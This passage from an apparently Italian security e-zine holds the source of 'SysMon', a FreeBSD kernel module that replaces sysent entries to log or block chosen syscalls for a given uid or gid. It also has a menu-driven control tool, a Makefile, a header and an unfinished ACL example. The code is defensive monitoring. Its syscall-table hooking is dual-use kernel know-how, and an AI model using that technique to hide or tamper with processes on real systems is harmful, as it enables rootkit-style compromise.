+						
+						if(pnew) free(pnew, M_SMON);
+						return 0;
+					}
+					
+
+					/*
+					 * if it is the last element put new
+					 * rule in append to sys_chain
+					 */
+
+					if(!sc->sys_chain.le_next) {
+
+						p_ss = malloc(
+						       sizeof(struct s_syscall),
+						       M_SMON, M_NOWAIT);
+						bzero(p_ss, sizeof(*p_ss));
+
+						p_ss->sys_call = check->n_call;
+						p_ss->sys_flags= check->n_flags;
+
+						LIST_INSERT_AFTER(sc, p_ss, 
+							 sys_chain);
+
+						return 0;
+					}
+				}
+			}
+			
+			/*
+		 	 * attach new rule
+		 	 */
+
+			if(!pr->s_chain.le_next) {
+
+				p_ss = malloc(sizeof(struct s_syscall), M_SMON,
+						M_NOWAIT);
+
+				bzero(p_ss, sizeof(*p_ss));
+
+				p_ss->sys_call	= check->n_call;
+				p_ss->sys_flags = check->n_flags;
+
+				LIST_INSERT_HEAD(&pnew->sys_head, p_ss, 
+						sys_chain);
+				LIST_INSERT_AFTER(pr, pnew, s_chain);
+				return(0);
+			}
+		}
+	}
+
+	/*
+	 * Never reached
+	 */
+
+	return (-1);
+}
+
+/*
+ * if n_call is 0 	we wanna delete all syscalls for that uid / gid
+ * if n_call is != 0	we wanna delete only that syscall for that uid / gid
+ */
+
+static int
+s_del_entry(struct s_check *check)
+{
+	struct s_rule 		*pr;
+	struct s_syscall	*sp;
+
+	if(!s_head.lh_first) 
+		return (-1);
+
+	
+	/*
+	 * Delete all syscalls for that rule
+	 */
+
+	if(!check->n_call) {
+		LIST_FOREACH(pr, &s_head, s_chain) {
+			
+			if((pr->s_flags == check->flags) && 
+					(pr->s_id == check->id)) {
+		 		struct s_rule *rp_next;
+			
+				while(LIST_FIRST(&pr->sys_head)) {
+			
+					sp = LIST_FIRST(&pr->sys_head);
+
+					LIST_REMOVE(LIST_FIRST(&pr->sys_head), 
+							sys_chain);
+
+			    		if(sp) free(sp, M_SMON);
+				}
+
+				/*
+				 * We don't want a rule without entries
+				 */
+
+				rp_next = LIST_NEXT(pr, s_chain);
+				LIST_REMOVE(pr, s_chain);
+				if(pr) free(pr, M_SMON);
+				pr = rp_next;
+				return 0;
+			}
+		}
+	}
+	
+	/*
+	 * Delete only a syscall for that rule
+	 */
+		
+	if(check->n_call > 0) {		
+		LIST_FOREACH(pr, &s_head, s_chain) {
+
+			if((pr->s_flags == check->flags) &&
+					(pr->s_id == check->id)) {
+
+				LIST_FOREACH(sp, &pr->sys_head, sys_chain) {
+					if(check->n_call == sp->sys_call) {
+						struct s_syscall *sp_next;
+					 
+			  			sp_next = LIST_NEXT(sp, 
+								sys_chain);
+						
+			  			LIST_REMOVE(sp, sys_chain);
+			  		
+						if(sp) free(sp, M_SMON);
+
+						sp = sp_next;
+
+					  	/*
+					  	 * we don't want a rule without 
+					  	 * entries
+					  	 */
+
+						if(!pr->sys_head.lh_first) {
+					   		struct s_rule *rp_next;
+
+					   		rp_next = 
+							 LIST_NEXT(pr, s_chain);
+					   		
+							LIST_REMOVE(pr,s_chain);
+					   		if(pr) free(pr, M_SMON);
+							pr = rp_next; 
+						}
+
+						return 0;
+					}
+				}
+			}
+		}
+	}
+	
+	return (-1);
+}
+
+/*
+ * Temporary s_list_entry...
+ * This function writes directly from kernel... with printf()
+ * Yeah it sucks... but I have no time...
+ */
+
+static int
+s_list_entry(struct s_check *check)
+{
+	register struct s_rule	*pr;
+
+        if(!s_head.lh_first)
+                return (-1);
+		
+
+	LIST_FOREACH(pr, &s_head, s_chain) {
+		register struct s_syscall *sp;
+
+		if(pr->s_flags == S_UID)
+			printf("uid-> ");
+		if(pr->s_flags == S_GID)
+			printf("gid-> ");
+			
+		printf("%d\n", pr->s_id);
+			
+
+		LIST_FOREACH(sp, &pr->sys_head, sys_chain) {
+			printf("\tcall-> %d ", sp->sys_call);
+			printf("flags-> ");
+			if(sp->sys_flags == SYS_LOG)
+				printf("log\n");
+			if(sp->sys_flags == SYS_BLOCK)
+				printf("block\n");
+		}
+	}
+
+	return 0;
+}
+	
+
+/*
+ * return 	-1 if SysMon is not active for that syscall
+ * 		 0 if active
+ * 		 1 if block
+ * 		
+ */
+
+static int
+s_check_entry(struct proc *p, int pos)
+{
+	register struct s_rule 		*rp;
+	register struct s_syscall 	*sp;
+
+	
+
+	LIST_FOREACH(rp, &s_head, s_chain) {
+		if( (rp->s_id == p->p_cred->p_ruid)  ||
+				(rp->s_id == p->p_cred->p_rgid) ) {
+
+			LIST_FOREACH(sp, &rp->sys_head, sys_chain) {
+
+				if(pos == sp->sys_call) {
+					switch(sp->sys_flags) {
+						case SYS_LOG:
+								return 0;
+						case SYS_BLOCK:
+								return 1;
+					}
+				}
+			}
+		}
+	}
+	
+	return (-1);
+}
+
+
+/*
+ * Module handler
+ */
+
+
+static int
+module_handler(module_t mod, int cmd, void *arg)
+{
+#if defined(MON_PROTOCOL) && (__FreeBSD_version < 400000)
+	int s;
+#define attach(x)	inetsw[ip_protox[x]].pr_usrreqs->pru_attach
+#endif
+	switch(cmd) {
+		case MOD_LOAD:
+		 printf("--SysMon v1.0beta Loaded--\n");
+		 s_rules_init();
+		 sysent[SYS_setsockopt].sy_call = (sy_call_t *) s_setsockopt;
+		 sysent[SYS_mount].sy_call	= (sy_call_t *) s_mount; 
+		 sysent[SYS_open].sy_call	= (sy_call_t *) s_open;
+		 sysent[SYS_link].sy_call	= (sy_call_t *) s_link;
+		 sysent[SYS_mkfifo].sy_call	= (sy_call_t *) s_mkfifo;
+		 sysent[SYS_seteuid].sy_call	= (sy_call_t *) s_seteuid;
+		 sysent[SYS_socket].sy_call	= (sy_call_t *) s_socket;
+		 sysent[SYS_unlink].sy_call	= (sy_call_t *) s_unlink;
+		 sysent[SYS_execve].sy_call	= (sy_call_t *) s_execve;
+		 sysent[SYS_setuid].sy_call	= (sy_call_t *) s_setuid;
+		 sysent[SYS_setgid].sy_call	= (sy_call_t *) s_setgid;
+		 sysent[SYS_chmod].sy_call	= (sy_call_t *) s_chmod;
+		 sysent[SYS_chown].sy_call	= (sy_call_t *) s_chown;
+#if defined(MON_PROTOCOL) && (__FreeBSD_version < 400000)
+		 s = splnet();
+		 old_rip_attach			= attach(IPPROTO_RAW);
+		 attach(IPPROTO_RAW)		= s_rip_attach;
+		 attach(IPPROTO_ICMP)		= s_rip_attach;
+		 attach(IPPROTO_IGMP)		= s_rip_attach;
+		 attach(IPPROTO_IPIP)		= s_rip_attach;
+		 old_udp_attach			= attach(IPPROTO_UDP);
+		 attach(IPPROTO_UDP)		= s_udp_attach;
+		 splx(s);
+#endif
+		 break;
+		 
+		 
+		case MOD_UNLOAD:
+		 printf("--SysMon v1.0beta Unloaded--\n");
+		 sysent[SYS_setsockopt].sy_call = (sy_call_t *) setsockopt;
+		 sysent[SYS_mount].sy_call	= (sy_call_t *) mount;
+		 sysent[SYS_open].sy_call	= (sy_call_t *) open;
+		 sysent[SYS_link].sy_call	= (sy_call_t *) link; 
+		 sysent[SYS_mkfifo].sy_call	= (sy_call_t *) mkfifo;
+		 sysent[SYS_seteuid].sy_call	= (sy_call_t *) seteuid;
+		 sysent[SYS_socket].sy_call	= (sy_call_t *) socket;
+		 sysent[SYS_unlink].sy_call	= (sy_call_t *) unlink;
+		 sysent[SYS_execve].sy_call	= (sy_call_t *) execve;
+		 sysent[SYS_setuid].sy_call	= (sy_call_t *) setuid;
+		 sysent[SYS_setgid].sy_call	= (sy_call_t *) setgid;
+		 sysent[SYS_chmod].sy_call	= (sy_call_t *) chmod;
+		 sysent[SYS_chown].sy_call	= (sy_call_t *) chown;
+#if defined(MON_PROTOCOL) && (__FreeBSD_version < 400000)
+		 s = splnet();
+		 attach(IPPROTO_RAW)		= old_rip_attach;
+		 attach(IPPROTO_ICMP)		= old_rip_attach;
+		 attach(IPPROTO_IGMP)		= old_rip_attach;
+		 attach(IPPROTO_IPIP)		= old_rip_attach;
+		 attach(IPPROTO_UDP)		= old_udp_attach;
+		 splx(s);
+#endif
+		 s_rules_bye();		 
+	 	 break;
+	}
+
+	return 0;
+}
+
+/*
+ * SYSCALL MODULE
+ *
+ * This part implements a new syscall to interface this support with your
+ * system
+ *
+ */
+
+
+#define	PAD_(t)	(sizeof(register_t) <= sizeof(t) ? \
+				0 : sizeof(register_t) - sizeof(t))
+
+struct sctl_args {
+	struct s_check *check;	char check_[PAD_(struct s_check *)];
+};
+
+
+static int	S_ctl	__P((struct proc *, struct sctl_args *));
+
+static struct sysent S_sysent = {
+	1,
+	(sy_call_t *) S_ctl
+};
+
+#define MAX_ID	32000
+
+static int
+S_ctl(struct proc *p, struct sctl_args *r)
+{
+	int	error; 
+
+	/*
+	 * check permission
+	 */
+#if (__FreeBSD_version < 400000)
+	if((error = suser(p->p_ucred, &p->p_acflag))) 
+#else
+	if((error = suser(p)))
+#endif
+		return (error);
+	/*
+	 * check params
+	 */
+
+	if(r->check->action != LIST_RULE) {
+		
+		if(r->check->id < 0 || r->check->id > MAX_ID)
+			return(EINVAL);
+	
+		if((r->check->n_call < 0) || r->check->n_call > LAST_CALL)
+			return(EINVAL);
+
+		if((r->check->action != DEL_RULE) && (!r->check->n_call))
+			return(EINVAL);
+
+		if((r->check->flags != S_UID) && (r->check->flags != S_GID)) 
+			return(EINVAL);
+
+		if((r->check->action != DEL_RULE) && 
+		   	(r->check->n_flags != SYS_BLOCK) &&
+		   		(r->check->n_flags != SYS_LOG))
+			return(EINVAL);
+	}
+	
+	switch(r->check->action) {
+		
+		case DEL_RULE:	
+				if(s_del_entry(r->check) == -1)
+					return(EINVAL);
+				break;
+		case ADD_RULE:
+				if(s_add_entry(r->check) == -1)
+					return(EINVAL);
+				break;
+		case LIST_RULE:
+				if(s_list_entry(r->check) == -1)
+					return(EINVAL);
+				break;
+		default:
+				return(EINVAL);
+	}
+
+	return 0;
+}
+
+static int offset = NO_SYSCALL;
+
+
+static int	S_Handle	__P((struct module *, int, void *));
+
+static int
+S_Handle(struct module *mod, int cmd, void *arg)
+{
+	return 0;
+}
+
+
+SYSCALL_MODULE(S_Call, &offset, &S_sysent, S_Handle, NULL);
+
+static void 
+log_proc(struct proc *p, char *name)
+{
+	log(LOG_INFO, "[sysmon]: %s (id=%d, uid=%d name=%s)\n", 
+			name, p->p_pid, p->p_cred->p_ruid, p->p_comm);
+}
+
+/*
+ * System calls
+ */ 
+
+static int
+s_setsockopt(struct proc *p, register struct setsockopt_args *uap)
+{
+	register int val;
+	
+	if((val = s_check_entry(p, SETSOCKOPT)) != -1) {
+		log_proc(p, "setsockopt()");
+		log(LOG_INFO, "setsockopt(level=%d,name=%d)\n", 
+				uap->level, uap->name);
+		if(val == 1) {
+			log(LOG_INFO, "setsockopt prohibited!");
+			return EPERM;
+		}
+	}
+	
+	return(setsockopt(p, uap));
+}
+
+
+#ifdef SKIP_MOUNTD
+
+/*
+ * Don't change this if you don't know what it does...
+ */
+	#define 	MOUNTD_NAME		"mountd"
+
+#endif
+
+static int
+s_mount(struct proc *p, register struct mount_args *uap)
+{
+#ifdef SKIP_MOUNTD
+	struct proc *p1;
+	pid_t mountd_id = 0; 
+
+	
+	LIST_FOREACH(p1, &allproc, p_list) {
+		if(!strcmp(p1->p_comm, MOUNTD_NAME)) 
+			mountd_id = p1->p_pid;
+	}
+
+	if(p->p_pid != mountd_id) {
+#endif
+		if(s_check_entry(p, MOUNT) != -1) {
+			log_proc(p, "mount()");
+			log(LOG_INFO, "mount(type=%s, dir=%s, flags=%x)\n",
+					uap->type, uap->path, uap->flags);
+		}
+#ifdef SKIP_MOUNTD		
+	}
+#endif
+	
+	return(mount(p, uap));
+}
+
+/*
+ * This function doesn't use SYS_BLOCK....
+ */
+
+static int
+s_open(struct proc *p, register struct open_args *uap)
+{
+#ifdef SKIP_DEVICE	
+	if(!strstr(uap->path, "/dev/")) {
+#endif
+		if(s_check_entry(p, OPEN) != -1) {
+			log_proc(p, "open()");
+			log(LOG_INFO, "open(path=%s, flags=%x, mode=%x)\n",
+				uap->path, uap->flags, uap->mode);
+		} 
+#ifdef SKIP_DEVICE		
+	}
+#endif	
+
+	return(open(p, uap));
+}
+
+#ifdef SKIP_DEVICE
+static char *
+strstr(s, find)
+	register char *s, *find;
+{
+	register char c, sc;
+	register size_t len;
+
+	if ((c = *find++) != 0) {
+		len = strlen(find);
+		do {
+			do {
+				if ((sc = *s++) == 0)
+					return (NULL);
+			} while (sc != c);
+		} while (strncmp(s, find, len) != 0);
+		s--;
+	}
+	return ((char *)s);
+}
+#endif
+
+
+static int
+s_link(struct proc *p, struct link_args *uap)
+{
+	register int val;
+	
+	if((val = s_check_entry(p, LINK)) != -1) {
+		log_proc(p, "link()");
+		log(LOG_INFO, "link(path=%s, link=%s)\n", uap->path, uap->link);
+		
+		if(val == 1) {
+			log(LOG_INFO, "link prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(link(p, uap));
+}
+
+static int
+s_mkfifo(struct proc *p, struct mkfifo_args *uap)
+{
+	register int val;
+
+	if((val = s_check_entry(p, MKFIFO)) != -1) {
+	
+		log_proc(p, "mkfifo()");
+		log(LOG_INFO, "mkfifo(path=%s, mode=%d)\n",
+				uap->path, uap->mode);
+
+		if(val == 1) {
+			log(LOG_INFO, "mkfifo prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(mkfifo(p, uap));
+}
+
+static int
+s_seteuid(struct proc *p, struct seteuid_args *uap)
+{
+	register int val;
+
+	if((val = s_check_entry(p, SETEUID)) != -1) {
+		
+		log_proc(p, "seteuid()");
+		log(LOG_INFO, "seteuid(%d)\n", uap->euid);
+
+		if(val == 1) {
+			log(LOG_INFO, "seteuid prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(seteuid(p, uap));
+}
+
+static int
+s_socket(struct proc *p, struct socket_args *uap)
+{
+	register int val;
+
+	if((val = s_check_entry(p, SOCKET)) != -1) {
+
+		log_proc(p, "socket()");
+		log(LOG_INFO, "socket(%d, %d, %d)\n", 
+				uap->domain, uap->type, uap->protocol);
+
+		if(val == 1) {
+			log(LOG_INFO, "socket prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(socket(p, uap));
+}
+
+
+#if defined(MON_PROTOCOL) && (__FreeBSD_version < 400000)
+static int
+s_udp_attach(struct socket *so, int proto, struct proc *p)
+{
+	register int val;
+	
+	if((val = s_check_entry(p, UDP)) != -1) {
+		log_proc(p, "udp_attach()");
+
+		if(val == 1) {
+			log(LOG_INFO, "udp prohibited!\n");
+			return EPERM;
+		}
+	}
+		
+	return((*old_udp_attach)(so, proto, p));
+}
+
+/*
+ * rip_attach() requires super user... 
+ * there is no sense to block it... it is only logged
+ */
+
+static u_long	rip_sendspace = 8192;	/* RIPSNDQ */
+static u_long	rip_recvspace = 8192;	/* RIPRCVQ */
+
+extern struct inpcbinfo ripcbinfo;
+	  
+static int
+s_rip_attach(struct socket *so, int proto, struct proc *p)
+{
+	struct inpcb *inp;
+	int error, s;
+
+	inp = sotoinpcb(so);
+	
+	if (inp)
+		panic("rip_attach");
+	if (p && (error = suser(p->p_ucred, &p->p_acflag)) != 0)
+		return error;
+
+        if(s_check_entry(p, RIP) != -1) 
+	        log_proc(p, "rip_attach()");
+
+	s = splnet();
+	error = in_pcballoc(so, &ripcbinfo, p); 					splx(s);
+	if (error)
+		return error;
+	error = soreserve(so, rip_sendspace, rip_recvspace);
+	if (error)
+		return error;
+	inp = (struct inpcb *)so->so_pcb;
+	inp->inp_ip_p = proto;
+	return 0;
+}
+#endif	/* __FreeBSD_version */
+
+/*
+ * Further syscalls
+ */
+
+static int
+s_unlink(struct proc *p, register struct unlink_args *uap)
+{
+        register int val;
+
+        if((val = s_check_entry(p, UNLINK)) != -1) {
+	        log_proc(p, "unlink()");
+	        log(LOG_INFO, "unlink(path=%s)\n", uap->path);
+
+		if(val == 1) {
+			log(LOG_INFO, "unlink prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(unlink(p, uap));
+}
+
+/*
+ * Only log is allowed for these syscalls
+ */
+
+static int
+s_execve(struct proc *p, register struct execve_args *uap)
+{
+	if(s_check_entry(p, EXECVE) != -1) {
+		log_proc(p, "execve()");
+		log(LOG_INFO, "execve(name=%s)\n", uap->fname);
+		
+	}
+
+	return(execve(p, uap));
+}
+
+static int
+s_setuid(struct proc *p, register struct setuid_args *uap)
+{
+	if(s_check_entry(p, SETUID) != -1) {
+		log_proc(p, "setuid()");
+		log(LOG_INFO, "setuid(name=%d)\n", uap->uid);
+	}
+
+	return(setuid(p, uap));
+}
+
+static int
+s_setgid(struct proc *p, register struct setgid_args *uap)
+{
+	if(s_check_entry(p, SETGID) != -1) {
+		log_proc(p, "setgid()");
+                log(LOG_INFO, "setgid(name=%d)\n", uap->gid);
+        }
+
+        return(setgid(p, uap));
+}
+
+/*
+ * Log and block
+ */
+
+static int
+s_chmod(struct proc *p, register struct chmod_args *uap)
+{
+	register int val;
+
+	if((val = s_check_entry(p, CHMOD)) != -1) {
+		log_proc(p, "chmod()");
+		log(LOG_INFO, "chmod(path=%s mode=%o)\n", uap->path, uap->mode);
+
+		if(val == 1) {
+			log(LOG_INFO, "chmod prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(chmod(p, uap));
+}
+	
+static int
+s_chown(struct proc *p, register struct chown_args *uap)
+{
+	register int val;
+
+	if((val = s_check_entry(p, CHOWN)) != -1) {
+		log_proc(p, "chown()");
+		log(LOG_INFO, "chown(path=%s uid=%d gid=%d)\n", 
+			uap->path, uap->uid, uap->gid);
+	
+		if(val == 1) {
+			log(LOG_INFO, "chown prohibited!\n");
+			return EPERM;
+		}
+	}
+
+	return(chown(p, uap));
+}
+<-X->
+
+<-| fbsd_security/smonitor/Makefile crc32: 1294972129 |->
+# SoftProject 2000 - Digital Sekurity for Y2k
+# Sikurezza.org - Italian Security MailingList
+#
+# COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+# Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+#
+# Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #3: Thu Mar i386
+# < pigpen@s0ftpj.org > 
+
+.PATH: /sys/kern
+SRCS	= sysmon.c 
+CFLAGS+= -I/sys -Wall
+KMOD	= sysmon 
+NOMAN	= t
+KLDMOD	= t
+
+KLDLOAD		= /sbin/kldload
+KLDUNLOAD	= /sbin/kldunload
+
+CLEANFILES+= ${KMOD}
+
+load:
+	${KLDLOAD} -v ./${KMOD}
+
+unload:
+	${KLDUNLOAD} -v -n ${KMOD}
+
+.include <bsd.kmod.mk>
+<-X->
+
+<-| fbsd_security/smonitor/sysmon.h crc32: 3968092835 |->
+/*
+ * Name: sysmon.h
+ * Date: Sun Apr 16 13:10:07 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org - Italian Security MailingList
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #5: Mon Mar i386
+ */
+
+#if defined(KERNEL) || defined(_KERNEL)
+
+/*
+ * KERNEL STRUCTURES & FLAGS
+ */
+
+struct s_syscall {
+	LIST_ENTRY(s_syscall) sys_chain;	/* syscall entry */
+	int  sys_call;				/* syscall type */
+	int  sys_flags;				/* syscall flags */
+};
+
+
+struct s_rule {
+	uid_t	s_id;
+	int	s_flags;
+	LIST_ENTRY(s_rule)	s_chain;
+	LIST_HEAD(,s_syscall)	sys_head; 
+};
+
+#else
+# include <sys/param.h>
+#endif
+
+
+#define 	SYS_LOG		1
+#define		SYS_BLOCK	2
+
+
+/* s_flags */
+
+#define		S_UID		1	
+#define		S_GID		2
+
+/*
+ * Syscall type (used for n_call and for s_flags & sys_call)
+ */
+
+#define		OPEN		1	
+#define		LINK		2
+#define		MKFIFO		3
+#define		MOUNT		4
+#define		SETSOCKOPT	5
+#define		SETEUID		6
+#define		SOCKET		7
+#define		UNLINK		8
+#define		EXECVE		9
+#define		SETUID		10
+#define		SETGID		11
+#define		CHMOD		12
+#define		CHOWN		13
+#if defined(MON_PROTOCOL) && (__FreeBSD_version<400000)
+# define	RIP		14
+# define	UDP		15
+# define	LAST_CALL	15
+#else
+# define	LAST_CALL	13
+#endif
+
+/*
+ * Structure used to pass actions from user-level to kernel-level
+ */
+
+struct s_check {
+	int id;		/* uid or gid 		*/
+	int flags;	/* s_uid or s_gid 	*/
+	int n_call; 	/* OPEN, LINK ... 	*/
+	int n_flags;	/* log, block 		*/
+	int action;	/* ADD_RULE, DEL_RULE..	*/
+};
+
+/* id */
+
+#define ADD_RULE	1
+#define DEL_RULE	2
+#define LIST_RULE	3
+<-X->
+
+<-| fbsd_security/smonitor/smon.c crc32: 1835593566 |->
+/*
+ * Name: SySMon
+ * Date: Thu Apr 20 15:12:01 2000
+ * Author: pIGpEN [ pigpen@s0ftpj.org, deadhead@sikurezza.org ]
+ *
+ * SoftProject 2000 - Digital Sekurity for Y2k
+ * Sikurezza.org - Italian Security MailingList
+ *
+ * COFFEE-WARE LICENSE - This source code is like "THE BEER-WARE LICENSE" by
+ * Poul-Henning Kamp <phk@FreeBSD.ORG> but you can give me in return a coffee.
+ *
+ * Tested on: FreeBSD 3.4-RELEASE FreeBSD 3.4-RELEASE #5: Mon Mar i386
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/syscall.h>
+#include <sys/types.h>
+#include <sys/module.h>
+#include <sys/queue.h>
+#include <unistd.h>
+#include "sysmon.h"
+
+void	 	usage			__P((void));
+void 		add_rule		__P((void));
+void 		del_rule		__P((void));
+void 		list_rule		__P((void));
+
+int 		findbyname		__P((char *));
+void		printcalls		__P((void));
+void		menu			__P((void));
+
+#define 	clear			printf("\033[2J\033[1;1H")
+
+void
+menu(void)
+{
+	printf("\n\n--------------------\n"
+	       "-- SySMon 1.0Beta --\n"
+	       "--------------------\n\n\n");
+
+	printf("1) Add rule\n");
+	printf("2) Del rule\n");
+	printf("3) List rules\n");
+	printf("4) Quit\n\n");
+	printf("sysmon> ");
+}
+
+int
+main(void)
+{
+	int choice;
+
+	clear;
+	
+	do {
+		menu();
+		scanf("%d", &choice);
+
+	
+		switch(choice) {
+			case 1:
+				add_rule();
+				break;
+			case 2:
+				del_rule();
+				break;
+			case 3:
+				list_rule();
+				break;
+		}
+
+	} while(choice!=4);
+
+	return 0;
+}
+
+struct s_sysc {
+	char *name;
+	int position;
+} scall[] = {
+	{	"open", 	OPEN 		},
+	{	"link",		LINK 		},
+	{	"mkfifo",	MKFIFO		},
+	{	"mount",	MOUNT		},
+	{	"setsockopt",	SETSOCKOPT	},
+	{	"seteuid",	SETEUID		},
+	{	"socket",	SOCKET		},
+#if (__FreeBSD_version < 400000)
+	{	"raw",		RIP		},
+	{	"udp",		UDP		},
+#endif
+	{	"unlink",	UNLINK		},
+	{	"execve",	EXECVE		},
+	{	"setuid",	SETUID		},
+	{	"setgid",	SETGID		},
+	{	"chmod",	CHMOD		},
+	{	"chown",	CHOWN		}
+};
+
+void
+printcalls(void)
+{
+	int i;
+
+	for(i=0; i< (sizeof(scall) / sizeof(struct s_sysc)); i++) 
+		printf("%s ", scall[i].name);
+}
+
+int
+findbyname(char *name) 
+{
+	int i;
+	
+	for(i = 0; i < ( sizeof(scall) / sizeof(struct s_sysc)); i++)
+		if(!strcmp(name, scall[i].name))
+			return (scall[i].position);
+	
+	return (-1);
+}
+
+void
+add_rule(void)
+{
+        int syscall_num;
+        struct module_stat stat;
+	struct s_check r;
+	char choice[10];
+	int error;
+
+	bzero(&r, 	sizeof r);
+	bzero(&choice, 	sizeof choice);
+	
+	while(strcmp(choice,"uid") && strcmp(choice, "gid")) {
+		clear;
+		printf("uid or gid ? ->  ");
+		scanf("%s", choice);
+	}
+	
+	
+	if(!strcmp(choice, "uid")) {
+		r.flags = S_UID;
+		printf("Uid= ");
+	}else{
+		r.flags = S_GID;
+		printf("Gid= ");
+	}
+
+	scanf("%d", &r.id);
+	
+
+	while(strcmp(choice, "ok")) {
+		int index;
+		
+		printf("System calls:\n");
+		printcalls();
+		printf("\n\ncall (ok to exit) > ");
+		scanf("%s", choice);
+		if(!strcmp(choice, "ok"))
+			break;
+		if((index = findbyname(choice)) == -1) 
+			printf("Syscall %s is not available\n", choice);
+		else {
+			char action[10];
+
+			bzero(action, sizeof action);
+
+			r.n_call = index;
+			
+			while(strcmp(action,"block") && strcmp(action,"log")){
+				printf("action (block, log): ");
+				scanf("%s", action);
+			}
+				
+			if(!strcmp(action, "block"))
+				r.n_flags = SYS_BLOCK;
+			else
+				r.n_flags = SYS_LOG;
+			
+			r.action = ADD_RULE;
+
+			stat.version = sizeof(stat);
+			modstat(modfind("S_Call"), &stat);
+			syscall_num = stat.data.intval;
+
+			if((error = syscall(syscall_num, &r)))
+				perror("syscall(ADD)");
+		}
+	}
+
+					
+}
+
+void
+list_rule(void)
+{
+	struct s_check r;
+	struct module_stat stat;
+	int error;
+	int syscall_num;
+
+	bzero(&r, sizeof r);
+
+	r.action = LIST_RULE;
+
+	stat.version = sizeof stat;
+	modstat(modfind("S_Call"), &stat);
+	syscall_num = stat.data.intval;
+
+	if((error = syscall(syscall_num, &r)))
+		perror("syscall(LIST)");
+}
+
+void
+del_rule(void)
+{
+	struct s_check r;
+	struct module_stat stat;
+	int syscall_num;
+	int error;
+	char choice[10];
+
+	bzero(&r, 	sizeof r);
+	bzero(choice, 	sizeof choice);
+
+	while(strcmp(choice, "uid") && strcmp(choice, "gid")) {
+		clear;
+		printf("uid or gid ? -> ");
+		scanf("%s", choice);
+	}
+
+	if(!strcmp(choice, "uid")) {
+		r.flags = S_UID;
+		printf("Uid-> ");
+	} else {
+		r.flags = S_GID;
+		printf("Gid-> ");
+	}
+
+		
+	scanf("%d", &r.id);
+
+	r.action = DEL_RULE;
+	
+	bzero(choice, sizeof choice);
+	while(strcmp(choice,"ok") && strcmp(choice,"all")) {
+		int index;
+	
+	        printf("System calls:\n");
+		printcalls();
+		printf("\n\ncall (ok to exit, all for global selection) > ");
+		scanf("%s", choice);
+									                	if(!strcmp(choice, "ok") || !strcmp(choice, "all"))            
+			break;
+										                if((index = findbyname(choice)) == -1)				                        printf("Syscall %s is not available\n", choice);
+		else {
+			
+			r.n_call = index;
+			stat.version = sizeof stat;
+			modstat(modfind("S_Call"), &stat);
+			syscall_num = stat.data.intval;
+
+			if((error = syscall(syscall_num, &r))) 
+				perror("syscall(DEL)");
+		}
+	}
+
+	if(!strcmp(choice, "all")) {
+		r.n_call = 0;
+		stat.version = sizeof stat;
+		modstat(modfind("S_Call"), &stat);
+		syscall_num = stat.data.intval;
+		    
+		if((error = syscall(syscall_num, &r)))
+			perror("syscall(DEL)");
+	}
+}
+<-X->
+
+- - - [   L E   A C L   D i   F R E E B S D  4 . X
+
+	SMonitor e' un supporto che puo' andare bene per le versioni 3.4,
+	ma anche FreeBSD si sta orientando verso le POSIX.1e attraverso le
+	acl(3) in fase di sviluppo dalla versione 4.0 di FreeBSD.
+
+	Queste introducono il concetto di Capabilities, file system ACLs, 
+	Information Flow Labels, Mandatory Access Control e Auditing, molto 
+	di piu' di quello che possa fare smonitor o spy.
+
+	Nel momento in cui sto scrivendo soltanto l'ACL e' stata fornita
+	nel kernel (manca ancora pero' il vero e proprio utilizzo)
+	mentre l'Auditing e il Mandatory Access Control sono in fase 
+	sperimentale..
+
+	
+	POSIX.1e ACL (Access Control Lists)
+
+	 Le ACL permettono agli utenti di specificare gli accessi ai file 
+	 garantendo dei diritti aggiuntivi diversi da quelli dell'owner del
+	 file. In poche parole questo vuole dire che si possono gestire i
+	 propri file senza l'intervento dell'admin che aggiunga nuovi gruppi.
+
+	 La struttura base per le acl e' la seguente:
+
+	 struct acl {
+	         int                     acl_cnt;
+	         struct acl_entry        acl_entry[ACL_MAX_ENTRIES];
+	 };
+
+	 dove:
+	 	o   acl_cnt e' il numero di entry
+		o   acl_entry[x] sono le entry caratterizzate dalla seguente
+				 struttura:
+
+	 struct acl_entry {
+	         acl_tag_t       ae_tag;
+	         uid_t           ae_id;
+	         acl_perm_t      ae_perm;
+	 };
+
+	 I valori validi per ae_tag sono i seguenti:
+
+		 #define ACL_USER_OBJ    0x00000001
+		 #define ACL_USER        0x00000002
+		 #define ACL_GROUP_OBJ   0x00000004
+		 #define ACL_GROUP       0x00000008
+		 #define ACL_MASK        0x00000010
+		 #define ACL_OTHER       0x00000020
+		 #define ACL_OTHER_OBJ   ACL_OTHER
+
+	Quelli per ae_perm:
+
+		#define ACL_PERM_EXEC   0x0001
+		#define ACL_PERM_WRITE  0x0002
+		#define ACL_PERM_READ   0x0004
+		#define ACL_PERM_NONE   0x0000
+		
+		#define ACL_PERM_BITS   
+			(ACL_PERM_EXEC | ACL_PERM_WRITE | ACL_PERM_READ)
+		
+		#define ACL_POSIX1E_BITS        
+			(ACL_PERM_EXEC | ACL_PERM_WRITE | ACL_PERM_READ)
+
+	La regola viene passata per esempio attraverso la acl_set_file(3).
+
+	Ecco un sorgente compilabile con:
+
+		cc ex_setacl.c -lposix1e
+
+<-| fbsd_security/acl/ex_setacl.c crc32: 3437218918 |->
+/*
+ *
+ * Esempio di utilizzo delle POSIX extensions di FreeBSD
+ *
+ * Per ulteriori informazioni sul supporto acl:
+ * http://www.watson.org/fbsd-hardening/posix1e/
+ * 
+ */
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <sys/acl.h>
+
+int
+main(int argc, char **argv)
+{
+	acl_t acl;
+
+	if(argc != 2) {
+		printf("%s filename\n", argv[0]);
+		exit(0);
+	}
+
+	/*
